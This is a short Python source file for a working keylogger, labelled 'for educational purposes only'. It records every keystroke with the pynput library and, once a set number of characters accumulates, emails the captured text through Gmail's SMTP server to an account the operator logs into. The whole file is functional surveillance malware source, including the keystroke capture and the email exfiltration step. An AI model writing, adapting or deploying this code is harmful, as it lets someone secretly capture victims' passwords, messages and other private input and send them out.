# Simple keylogger with python
# This keylogger sends inputs to a desired email account of your choice
# For educational purposes only

import getpass
import smtplib

from pynput.keyboard import Key, Listener

print("""
                                                                                         
                                                                                         
      ,-.                      ,--,                                                      
  ,--/ /|                    ,--.'|                                                      
,--. :/ |                    |  | :     ,---.                                    __  ,-. 
:  : ' /                     :  : '    '   ,'\   ,----._,.  ,----._,.          ,' ,'/ /| 
|  '  /      ,---.       .--,|  ' |   /   /   | /   /  ' / /   /  ' /   ,---.  '  | |' | 
'  |  :     /     \    /_ ./|'  | |  .   ; ,. :|   :     ||   :     |  /     \ |  |   ,' 
|  |   \   /    /  |, ' , ' :|  | :  '   | |: :|   | .\  .|   | .\  . /    /  |'  :  /   
'  : |. \ .    ' / /___/ \: |'  : |__'   | .; :.   ; ';  |.   ; ';  |.    ' / ||  | '    
|  | ' \ \'   ;   /|.  \  ' ||  | '.'|   :    |'   .   . |'   .   . |'   ;   /|;  : |    
'  : |--' '   |  / | \  ;   :;  :    ;\   \  /  `---`-'| | `---`-'| |'   |  / ||  , ;    
;  |,'    |   :    |  \  \  ;|  ,   /  `----'   .'__/\_: | .'__/\_: ||   :    | ---'     
'--'       \   \  /    :  \  \---`-'            |   :    : |   :    : \   \  /           
            `----'      \  ' ;                   \   \  /   \   \  /   `----'            
                         `--`                     `--`-'     `--`-'                      
 """) 

 # set up email
email = input("Enter email: ")
password = getpass.getpass(prompt="Password: ", stream=None)
server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
server.login(email, password)

 # logger
full_log = " "
word = " "
email_char_limit = 50                                       # set the character limit you want

def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit


    if key == Key.space or key == Key.enter:                # Adds a space if the user presses the enter key
        word += " "
        full_log += word
        word = " "
        if len(full_log) >= email_char_limit:               # sends the mail once the typed characters reaches the limit
            send_log()
            full_log = " "

    elif key ==Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:                              # removes the last character
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:                                     # code stops running when the user presses esc 
        return False

# sends email
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

# code begins to listen for input
with Listener( on_press=on_press ) as listener:
    listener.join()